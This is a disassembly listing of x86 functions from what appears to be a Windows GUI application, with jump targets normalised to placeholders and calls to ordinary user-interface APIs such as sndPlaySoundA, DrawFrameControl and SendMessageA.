mov eax esi
call sub_466d90
pop eax
add eax [ esp + 0x3c ]
sub eax [ ebp + 0x40 ]
add eax [ ebp + 0x48 ]
mov edx [ esp ]
add edx [ ebx + 0x48 ]
cmp eax edx
jge r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax [ ebp + 0x40 ]
sub eax [ ebx + 0x48 ]
add eax 0x2
mov [ esp ] eax
sub ebp [ ebx + 0x4c ]
add ebp [ edi + 0x4c ]
add ebp 0x3
mov [ esp + 0x4 ] ebp
sub ebp [ edi + 0x4c ]
sub ebp [ ebx + 0x4c ]
mov [ esp + 0x4 ] ebp
jmp r-xdata
sub_472c5c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x30c ] 0x0
jne r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x18c ]
mov ecx ebx
mov dl 0x1
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x30c ] esi
mov dl 0x6
mov eax esi
call sub_448498
mov [ esi + 0x1cc ] 0x1
mov edx ebx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x68 ]
mov edx 0x2
mov eax esi
call sub_46db18
lea edx [ esi + 0x80 ]
mov eax [ rw-data ]
call sub_405c78
mov dl 0x1
mov eax esi
call sub_46db34
mov dl 0x3
mov eax esi
call sub_46db50
mov eax [ ebx + 0x210 ]
call sub_479c94
test al al
je r-xdata
xor edx edx
jmp r-xdata
mov eax [ ebx + 0x210 ]
mov al [ eax + 0x14 ]
add al 0xfd
sub al 0x2
jae r-xdata
mov eax esi
call sub_47fcfc
mov [ esi + 0x1c4 ] ebx
mov [ esi + 0x1c0 ] sub_472824
mov dl 0x1
sub_472d1c
push ebx
push esi
push edi
mov esi edx
mov edi eax
movzx eax [ esi + 0x4 ]
cmp eax 0x28
jg r-xdata
sub eax 0x2d
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
sub eax 0x40
jne r-xdata
cmp [ esi + 0x4 ] 0x28
jne r-xdata
sub eax 0x25
je r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_470d18
test eax eax
je r-xdata
mov edx esi
mov eax edi
call sub_471830
mov eax edi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
cmp [ edi + 0x294 ] 0x0
je r-xdata
mov eax [ edi + 0x2fc ]
test eax eax
je r-xdata
sub eax 0x2
je r-xdata
mov eax edi
call sub_470d18
mov ebx eax
mov eax ebx
call sub_4191a8
mov ebx eax
call sub_460748
test al 0x1
je r-xdata
mov eax edi
call sub_470d18
test eax eax
je r-xdata
mov eax edi
call sub_470d18
mov ebx eax
mov eax edi
call sub_47cf0c
cmp ebx eax
je r-xdata
mov eax [ edi + 0x2a8 ]
test eax eax
je r-xdata
mov [ eax + 0x296 ] 0x0
xor eax eax
mov [ edi + 0x2fc ] eax
xor eax eax
mov [ esi + 0xc ] eax
jmp r-xdata
mov eax edi
call sub_470d18
test eax eax
je r-xdata
jmp r-xdata
mov eax [ edi + 0x210 ]
call sub_479bf4
mov edx ebx
call sub_419738
mov ebx eax
mov eax [ ebx + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov eax edi
call sub_477b70
inc ebx
mov eax edi
call sub_470d18
call sub_4191a8
push eax
mov eax edi
call sub_47d41c
pop edx
call sub_419738
mov ebx eax
mov edx r-xdata
mov eax ebx
call sub_47b4dc
mov eax [ ebx + 0x40 ]
mov dl 0x1
call sub_448ecc
mov eax [ ebx + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
jmp r-xdata
mov eax [ edi + 0x30c ]
mov si 0xffeb
call sub_403324
mov eax edi
call sub_47cf44
mov edx [ eax + 0x40 ]
mov eax edi
call sub_4715d0
jmp r-xdata
call sub_460748
test al 0x4
je r-xdata
mov edx esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax [ edi + 0x2c4 ]
cmp edi eax
je r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
mov edx esi
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax edi
call sub_470d18
call sub_479bb4
test al al
je r-xdata
mov eax edi
call sub_470d18
call sub_479bb4
test al al
jne r-xdata
cmp [ edi + 0x2b0 ] 0x0
jne r-xdata
mov eax edi
call sub_470d18
cmp [ eax + 0x18 ] 0x0
jne r-xdata
mov eax edi
call sub_470d18
cmp [ eax + 0x50 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2c4 ]
mov ecx [ eax ]
call [ ecx - 0x14 ]
jmp r-xdata
mov eax edi
call sub_470d18
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x50 ]
test al al
jne r-xdata
mov eax edi
call sub_470d18
call sub_47b0a8
test eax eax
jne r-xdata
mov eax edi
call sub_470d18
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
jmp r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
call sub_460748
test al 0x4
je r-xdata
mov eax edi
call sub_470d18
call sub_479bf4
call sub_47a3f0
mov eax edi
call sub_470d18
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0x7c ]
sub_472fbb
inc [ ecx ]
add [ eax ] al
add [ 0x53000000 ] ch
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx - 0x10 ]
mov edx [ esi + 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc8 ]
pop esi
pop ebx
retn
sub_472fe4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_450988
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425280
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_473090
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ ebx + 0x4 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_425300
mov eax [ ebp - 0x4 ]
call sub_47ea90
mov edx [ eax + 0x40 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov eax [ eax + 0x14 ]
call sub_424a38
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
call sub_44894c
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
call sub_424e6c
push 0x0
mov edx [ ebx + 0x4 ]
xor ecx ecx
mov eax [ ebp - 0x4 ]
call sub_44d814
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473097
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x21c ]
mov edx [ ebp - 0x8 ]
call sub_425300
retn
sub_47309c
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_47debc
cmp [ ebx + 0x57 ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_47cf44
test eax eax
je r-xdata
mov eax ebx
call sub_47cf0c
test eax eax
je r-xdata
cmp [ eax + 0x50 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ eax + 0x50 ] 0x0
je r-xdata
xor edx edx
mov eax [ eax + 0x40 ]
call sub_448ecc
cmp [ ebx + 0x210 ] 0x0
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
mov edi eax
dec edi
test edi edi
jl r-xdata
xor edx edx
mov eax [ eax + 0x40 ]
call sub_448ecc
mov eax ebx
call sub_44f7b4
mov eax ebx
mov si 0xffee
call sub_403324
mov ecx [ ebx + 0x2ac ]
mov edx [ ebx + 0x2a8 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x194 ]
cmp [ ebx + 0x2a8 ] 0x0
je r-xdata
inc edi
xor esi esi
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov dl 0x1
mov eax ebx
call sub_470000
inc esi
dec edi
jne r-xdata
mov eax ebx
call sub_47d41c
mov edx esi
call sub_47a4d4
mov eax [ eax + 0x38 ]
mov edx [ eax ]
call [ edx + 0x1c ]
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
mov eax ebx
call sub_47d41c
mov edx esi
call sub_47a4d4
cmp [ eax + 0x38 ] 0x0
je r-xdata
push 0x2
push 0x0
call sndPlaySoundA
push 0x13
push r-xdata
call sndPlaySoundA
sub_4731ae
add [ eax ] al
push ebx
add esp 0xfffffff8
mov ebx eax
xor edx edx
mov eax ebx
call sub_448ecc
cmp [ ebx + 0x2c4 ] 0x0
je r-xdata
mov eax ebx
call sub_470120
pop ecx
pop edx
pop ebx
retn
mov edx esp
mov eax [ rw-data ]
mov eax [ eax ]
call sub_4540c8
mov eax [ ebx + 0x2c4 ]
mov edx [ esp ]
mov [ eax + 0x29c ] edx
mov edx [ esp + 0x4 ]
mov [ eax + 0x2a0 ] edx
sub_4731fc
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_44f8a0
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add [ esi ] eax
pop esi
pop ebx
retn
sub_473224
push ebx
push esi
push edi
mov esi edx
mov edi eax
mov edx esi
mov eax edi
call sub_450320
mov ebx eax
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add [ esi ] eax
mov eax ebx
pop edi
pop esi
pop ebx
retn
sub_47324c
push ebx
mov ebx eax
cmp [ ebx + 0x314 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
jne r-xdata
cmp [ ebx + 0x310 ] 0x0
jne r-xdata
mov eax [ ebx + 0x310 ]
test eax eax
je r-xdata
push 0x0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b9f4
mov [ ebx + 0x310 ] eax
push 0x1
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_46b9f4
mov [ ebx + 0x308 ] eax
mov edx ebx
call sub_46bb20
mov edx ebx
mov eax [ ebx + 0x308 ]
call sub_46bb20
sub_4732dc
push ebx
mov ebx eax
mov eax ebx
call sub_47e280
mov eax ebx
call sub_47ea90
test eax eax
je r-xdata
pop ebx
retn
mov eax ebx
call sub_47ea90
mov edx [ eax + 0x74 ]
mov eax ebx
call sub_44914c
sub_473304
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
mov ecx ebx
mov edx edi
mov eax esi
call sub_471d34
test [ esi + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
cmp bl 0x1
jne r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
mov eax edi
mov edx [ r-xdata ]
call sub_4032d8
xor edx edx
call sub_448ecc
sub_473360
push ebx
add esp 0xfffffff0
mov ebx eax
mov eax ebx
call sub_47c9ac
mov eax ebx
call sub_47ea90
mov edx [ eax + 0x74 ]
mov eax [ ebx + 0x21c ]
mov eax [ eax + 0x14 ]
call sub_424a38
mov edx esp
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov edx esp
mov eax [ ebx + 0x21c ]
call sub_424e6c
add esp 0x10
pop ebx
retn
sub_4733a0
push ebx
push esi
push edi
add esp 0xffffffe8
mov ebx eax
mov eax ebx
call sub_47502c
mov edx [ ebx + 0x48 ]
add edx 0x12
mov eax ebx
call sub_448740
lea ecx [ esp + 0x10 ]
mov eax [ ebx + 0x172 ]
add eax 0x12
mov edx [ ebx + 0x176 ]
call sub_417088
mov eax [ esp + 0x10 ]
mov [ ebx + 0x172 ] eax
mov eax [ esp + 0x14 ]
mov [ ebx + 0x176 ] eax
lea esi [ ebx + 0x190 ]
mov edi esp
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x0
push 0x12
lea eax [ esp + 0x8 ]
push eax
call OffsetRect
mov esi esp
lea edi [ ebx + 0x190 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
add esp 0x18
pop edi
pop esi
pop ebx
retn
sub_473418
push ebp
mov ebp esp
push ecx
push esi
mov [ ebp - 0x1 ] cl
mov esi eax
mov eax [ ebp + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
push eax
mov cl [ ebp - 0x1 ]
mov eax esi
call sub_47565c
mov eax esi
mov edx [ eax ]
call [ edx + 0x7c ]
pop esi
pop ecx
pop ebp
retn 0x8
sub_47344c
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov ecx esi
xor edx edx
mov eax edi
call sub_4722b0
mov eax esi
mov edx [ rw-data ]
call sub_4032b4
test al al
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax edi
test bl bl
je r-xdata
mov [ edi + 0x318 ] esi
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_4734a0
push ebx
push esi
call sub_4034f4
mov ebx edx
mov esi eax
mov eax [ esi + 0x320 ]
call sub_403128
mov edx ebx
and dl 0xfc
mov eax esi
call sub_4723a8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_4734d0
push ebx
push esi
push edi
push ecx
mov [ esp ] ecx
mov edi eax
mov ecx [ esp ]
mov eax edi
call sub_473224
mov ebx eax
mov esi [ edi + 0x2b0 ]
test esi esi
je r-xdata
mov eax ebx
pop edx
pop edi
pop esi
pop ebx
retn
mov eax esi
call sub_42bc74
test eax eax
jle r-xdata
xor ebx ebx
sub_473514
push ebx
push esi
mov esi edx
mov ebx eax
test esi esi
jl r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x114 ]
cmp esi eax
jge r-xdata
mov eax [ ebx + 0x210 ]
call sub_479bf4
mov edx esi
call sub_47a4d4
mov eax [ eax + 0x40 ]
pop esi
pop ebx
retn
sub_47354c
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x210 ]
test esi esi
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_479bf4
call sub_419538
pop esi
pop ebx
retn
sub_473570
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
xor eax eax
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2ac ]
call sub_48060c
mov eax [ eax + 0x210 ]
call sub_479bf4
mov edi eax
mov eax edi
call sub_419538
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
inc esi
xor ebx ebx
inc ebx
dec esi
jne r-xdata
mov edx ebx
mov eax edi
call sub_47a4d4
mov [ ebp - 0x8 ] eax
jmp r-xdata
mov edx ebx
mov eax edi
call sub_47a4d4
call sub_47b0a8
push eax
mov eax [ ebp - 0x4 ]
call sub_47b0a8
pop edx
cmp edx eax
jne r-xdata
sub_4735f0
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0xc8 ]
test al al
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x324 ]
cmp eax [ ebx + 0x16c ]
jne r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x198 ]
mov edx eax
mov eax ebx
call sub_4032b4
test al al
je r-xdata
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_470654
mov ebx eax
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x17c ]
mov ebx [ ebx + 0x16c ]
push 0x0
push 0x0
push 0xb409
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x318 ]
call sub_44f7d8
push eax
call PostMessageA
jmp r-xdata
push ebp
mov eax [ ebx + 0x16c ]
call sub_473570
pop ecx
mov esi eax
test esi esi
je r-xdata
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ ebx + 0x16c ]
call sub_4191a8
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
mov eax [ eax + 0x2ac ]
call sub_48060c
mov eax [ eax + 0x210 ]
call sub_479bf4
pop edx
call sub_419738
mov esi eax
mov eax [ ebx + 0x16c ]
call sub_47b0a8
mov edx eax
mov eax esi
call sub_47b3d0
mov dl [ esi + 0x30 ]
xor dl 0x1
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x2c ]
cmp [ esi + 0x30 ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x318 ]
call sub_44c098
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x318 ]
mov eax esi
mov edx [ eax + 0x48 ]
push edx
mov edx [ eax + 0x4c ]
push edx
mov edx esi
mov ecx [ eax + 0x44 ]
mov eax [ eax + 0x40 ]
xchg edx eax
mov ebx [ eax ]
call [ ebx + 0x84 ]
xor ebx ebx
jmp r-xdata
mov eax [ esi + 0x40 ]
xor edx edx
call sub_448ecc
jmp r-xdata
sub_47372c
push ebp
mov ebp esp
push ebx
push esi
push edi
mov esi ecx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_4032b4
test al al
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov edi eax
mov eax edi
call sub_479bd4
cmp eax [ ebx + 0x31c ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_4032d8
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x110 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x198 ]
mov edx [ ebp + 0x8 ]
mov [ edx ] eax
jmp r-xdata
sub_47379c
push ebx
push esi
mov ebx eax
mov eax ebx
call sub_470ed0
mov esi eax
mov [ esi + 0x23c ] ebx
mov eax [ ebx ]
mov eax [ eax + 0x19c ]
mov [ esi + 0x238 ] eax
mov dl [ ebx + 0x314 ]
mov eax esi
call sub_47334c
mov eax esi
pop esi
pop ebx
retn
sub_4737fc
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] edx
mov edi eax
mov eax [ ebp - 0x8 ]
test eax eax
jl r-xdata
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
inc eax
mov [ ebp - 0x14 ] eax
mov [ ebp - 0xc ] 0x0
cmp [ ebp - 0xd ] 0x0
jne r-xdata
inc ebx
xor esi esi
inc [ ebp - 0xc ]
dec [ ebp - 0x14 ]
jne r-xdata
mov eax edi
call sub_47a3f0
mov ebx eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47a4d4
mov edx eax
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x8 ]
xor edx edx
mov eax ebx
call sub_479eec
or edx 0xffffffff
mov eax ebx
call sub_47b780
inc esi
dec ebx
jne r-xdata
mov [ ebp - 0xd ] 0x1
jmp r-xdata
mov [ ebp - 0xd ] 0x0
mov eax edi
call sub_419538
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov edx esi
mov eax edi
call sub_47a4d4
call sub_47b0a8
push eax
mov edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_47a4d4
call sub_47b0a8
pop edx
cmp edx eax
jne r-xdata
sub_4738b0
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_473a96
push [ fs : eax ]
mov [ fs : eax ] esp
test esi esi
je r-xdata
mov edx esi
mov eax ebx
call sub_47d61c
mov eax [ ebx + 0x210 ]
call sub_479bf4
mov [ eax + 0x24 ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_473a9d
lea eax [ ebp - 0xc ]
mov edx 0x2
call sub_403edc
retn
cmp [ ebx + 0x318 ] 0x0
je r-xdata
xor edi edi
mov eax [ ebx + 0x318 ]
mov edx [ eax + 0x214 ]
cmp [ edx + 0x88 ] 0x0
je r-xdata
test edi edi
je r-xdata
mov edi eax
mov eax [ edi + 0x210 ]
call sub_4191a8
mov edx eax
mov eax [ edi + 0x214 ]
mov eax [ eax + 0x88 ]
call sub_4194d8
mov edi eax
mov eax esi
call sub_479bf4
call sub_419538
test eax eax
jle r-xdata
mov eax esi
call sub_479bf4
call sub_47a3f0
mov [ ebx + 0x31c ] eax
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405c78
mov edx [ ebp - 0x8 ]
mov eax [ ebx + 0x31c ]
call sub_47b4dc
mov eax edi
call sub_479bf4
call sub_419538
dec eax
push eax
mov eax edi
call sub_479bf4
push eax
mov eax [ ebx + 0x31c ]
call sub_479bf4
pop edx
pop ecx
call sub_4737fc
mov eax [ ebx + 0x2c4 ]
mov eax [ eax + 0x2ac ]
call sub_48060c
mov eax [ eax + 0x210 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_479bf4
call sub_419538
sub eax 0x2
push eax
mov eax [ ebp - 0x4 ]
call sub_479bf4
push eax
mov eax [ ebx + 0x31c ]
call sub_479bf4
pop edx
pop ecx
call sub_4737fc
mov eax edi
call sub_479bf4
call sub_419538
test eax eax
jle r-xdata
mov eax esi
call sub_479bf4
call sub_4737d0
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_455a18
mov edi eax
mov [ ebx + 0x320 ] edi
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405c78
mov edx [ ebp - 0xc ]
mov eax edi
call sub_455bc8
mov eax [ ebx + 0x31c ]
call sub_479bf4
call sub_419538
test eax eax
jle r-xdata
mov eax esi
call sub_479bf4
call sub_47a3f0
mov edi eax
mov [ ebx + 0x324 ] edi
mov edx [ ebx + 0x320 ]
mov eax edi
call sub_47b3d0
or edx 0xffffffff
mov eax edi
call sub_47b780
mov eax esi
call sub_479bf4
call sub_4737d0
sub_473aa4
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
test eax eax
jne r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
xor edx edx
call sub_480bb8
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x148 ]
mov edx ebx
mov ecx [ eax ]
call [ ecx + 0x10 ]
pop ebx
retn
sub_473ae0
push ebx
add esp 0xfffffff0
mov ebx eax
xor eax eax
mov al [ ebx + 0x181 ]
mov ax [ eax * 2 + rw-data ]
xor edx edx
mov dl [ ebx + 0x188 ]
or ax [ edx * 2 + rw-data ]
cmp [ ebx + 0x182 ] 0x2
sete dl
and edx 0x7f
or ax [ edx * 2 + rw-data ]
movzx eax ax
push eax
push 0x1
lea edx [ esp + 0x8 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x44 ]
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x160 ]
call sub_425280
push eax
call DrawFrameControl
add esp 0x10
pop ebx
retn
sub_473b48
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_46fca4
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov dl [ r-xdata ]
mov eax esi
call sub_42eb24
mov dl 0x1
mov eax esi
call sub_42eb4c
mov dl 0x2
mov eax esi
call sub_42eb60
push 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x0
push 0x100a
call SystemParametersInfoA
mov dl 0x1
mov eax esi
call sub_448498
cmp [ ebp - 0x4 ] 0x1
sbb edx edx
inc edx
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x138 ]
mov [ esi + 0x218 ] 0x0
mov edx 0x1
mov eax esi
call sub_47dde0
mov edx 0x1d
mov eax esi
call sub_448764
xor edx edx
mov eax esi
call sub_44fa0c
mov [ esi + 0x30e ] 0x1
mov [ ebp - 0xc ] esi
mov [ ebp - 0x10 ] sub_474864
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0xb020
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_40348c
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
call sub_4034e4
pop [ fs : 0x0 ]
add esp 0xc
sub_473c38
push ebx
push esi
add esp 0xfffffff8
call sub_4034f4
mov ebx edx
mov esi eax
mov [ esp + 0x4 ] esi
mov [ esp ] sub_474864
mov eax esp
push eax
push 0x1
push 0xb020
mov eax [ rw-data ]
mov eax [ eax ]
mov eax [ eax + 0x30 ]
push eax
call SendMessageA
mov edx ebx
and dl 0xfc
mov eax esi
call sub_46fd30
test bl bl
jle r-xdata
pop ecx
pop edx
pop esi
pop ebx
retn
mov eax esi
call sub_4034dc
sub_473c9c
push ebx
push esi
mov esi edx
mov ebx eax
mov al [ ebx + 0x227 ]
mov edx eax
sub dl 0x2
jb r-xdata
mov dx [ esi + 0x4 ]
sub dx 0x25
je r-xdata
sub dl 0x2
jb r-xdata
test al al
setne dl
mov eax ebx
call sub_4714b8
jmp r-xdata
dec dx
je r-xdata
mov ax [ esi + 0x4 ]
sub ax 0x25
je r-xdata
jmp r-xdata
mov edx esi
mov eax ebx
call sub_471830
mov eax ebx
call sub_470d18
test eax eax
je r-xdata
dec dx
je r-xdata
mov dl 0x1
mov eax ebx
call sub_4714b8
sub ax 0x2
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x104 ]
test al al
je r-xdata
test al al
sete dl
mov eax ebx
call sub_4714b8
jmp r-xdata
dec dx
je r-xdata
mov eax ebx
call sub_470d18
test eax eax
je r-xdata
mov eax ebx
call sub_470d18
call sub_479bb4
test al al
je r-xdata
mov eax ebx
call sub_470d18
call sub_479bb4
test al al
jne r-xdata
jmp r-xdata
mov eax ebx
call sub_470d18
call sub_479bb4
test al al
je r-xdata
mov eax ebx
call sub_470d18
mov ecx [ eax + 0x40 ]
mov edx ebx
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x14c ]
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x140 ]
mov eax [ eax + 0x40 ]
mov dl 0x1
mov ecx [ eax ]
call [ ecx + 0xd8 ]
mov [ esi + 0x4 ] 0x0
pop esi
pop ebx
retn
call sub_460748
test al 0x4
je r-xdata
mov eax ebx
call sub_470d18
mov eax [ eax + 0x40 ]
mov edx [ eax ]
call [ edx + 0xe0 ]
jmp r-xdata
pop esi
pop ebx
retn
mov eax ebx
call sub_470d18
call sub_479bf4
call sub_47a3f0
mov eax ebx
call sub_477b70
sub_473df4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_47022c
mov edi eax
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x110 ]
mov edx eax
mov eax edi
call sub_4032d8
mov edx 0x2
call sub_480010
mov eax edi
pop edi
pop esi
pop ebx
retn
sub_473e2c
push ebx
push esi
mov ebx edx
mov esi eax
mov edx ebx
mov eax esi
call sub_47eb00
test al al
jne r-xdata
pop esi
pop ebx
retn
cmp [ ebx ] 0x100
jne r-xdata
mov edx [ ebx + 0x4 ]
sub edx 0x1b
je r-xdata
cmp [ ebx + 0x4 ] 0x1b
jne r-xdata
add edx 0xfffffff6
sub edx 0x4
jae r-xdata
mov al 0x1
cmp [ esi + 0x296 ] 0x0
je r-xdata
mov eax esi
mov edx [ eax ]
call [ edx + 0x17c ]
cmp [ esi + 0x224 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
mov ecx [ eax ]
call [ ecx + 0x20 ]
sub_473e8c
push ebx
push ecx
mov ebx eax
mov eax ebx
call sub_470a1c
push 0x0
lea eax [ esp + 0x4 ]
push eax
push 0x0
push 0x100a
call SystemParametersInfoA
cmp [ esp ] 0x0
jne r-xdata
pop edx
pop ebx
retn
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x138 ]
sub_473ec0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30c ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x2a4 ]
test ebx ebx
je r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30c ] 0x1
xor eax eax
push ebp
push sub_473f6f
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x5 ] 0x0
mov eax ebx
call sub_4634fc
mov edi eax
dec edi
test edi edi
jl r-xdata
cmp [ ebp - 0x5 ] 0x0
jne r-xdata
inc edi
xor esi esi
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x30c ] 0x0
retn
